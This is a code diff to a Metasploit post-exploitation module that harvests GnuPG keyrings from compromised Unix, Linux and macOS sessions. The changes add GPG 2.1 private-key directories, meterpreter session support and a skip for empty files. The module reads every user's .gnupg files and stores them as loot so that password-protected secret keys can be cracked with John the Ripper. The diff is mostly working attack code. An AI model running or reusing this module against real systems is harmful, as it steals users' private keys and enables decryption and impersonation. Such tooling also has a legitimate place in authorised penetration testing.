@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
 
@@ -19,22 +15,36 @@ class Metasploit3 < Msf::Post
         machine. Password protected secret keyrings can be cracked with John the Ripper (JtR).
       },
       'License'        => MSF_LICENSE,
-      'Author'         => ['Dhiru Kholia <dhiru[at]openwall.com>'],
+      'Author'         =>
+        [
+          'Dhiru Kholia <dhiru[at]openwall.com>', # Original author
+          'Henry Hoggard' # Add GPG 2.1 keys, stop writing empty files
+        ],
       'Platform'       => %w{ bsd linux osx unix },
-      'SessionTypes'   => ['shell']
+      'SessionTypes'   => ['shell', 'meterpreter']
     ))
   end
 
   # This module is largely based on ssh_creds and firefox_creds.rb.
 
   def run
-    print_status("Finding .gnupg directories")
-    paths = enum_user_directories.map {|d| d + "/.gnupg"}
-    # Array#select! is only in 1.9
-    paths = paths.select { |d| directory?(d) }
+    paths = []
+    print_status('Finding GnuPG directories')
+    dirs = enum_user_directories
+    sub_dirs = ['private-keys-v1.d']
 
-    if paths.nil? or paths.empty?
-      print_error("No users found with a .gnupg directory")
+    dirs.each do |dir|
+      gnupg_dir = "#{dir}/.gnupg"
+      next unless directory?(gnupg_dir)
+      paths << gnupg_dir
+
+      sub_dirs.each do |sub_dir|
+        paths << "#{gnupg_dir}/#{sub_dir}" if directory?("#{gnupg_dir}/#{sub_dir}")
+      end
+    end
+
+    if paths.nil? || paths.empty?
+      print_error('No users found with a GnuPG directory')
       return
     end
 
@@ -53,16 +63,19 @@ class Metasploit3 < Msf::Post
         if directory?(target)
           next
         end
-        print_status("Downloading #{path}#{sep}#{file} -> #{file}")
+        print_status("Downloading #{target} -> #{file}")
         data = read_file(target)
         file = file.split(sep).last
         type = file.gsub(/\.gpg.*/, "").gsub(/gpg\./, "")
-        loot_path = store_loot("gpg.#{type}", "text/plain", session, data,
-          "gpg_#{file}", "GnuPG #{file} File")
-        print_good("File stored in: #{loot_path.to_s}")
+        if data.to_s.empty?
+          vprint_error("No data found for #{file}")
+        else
+          loot_path = store_loot("gpg.#{type}", "text/plain", session, data,
+            "gpg_#{file}", "GnuPG #{file} File")
+          print_good("File stored in: #{loot_path.to_s}")
+        end
       end
 
     end
   end
-
 end
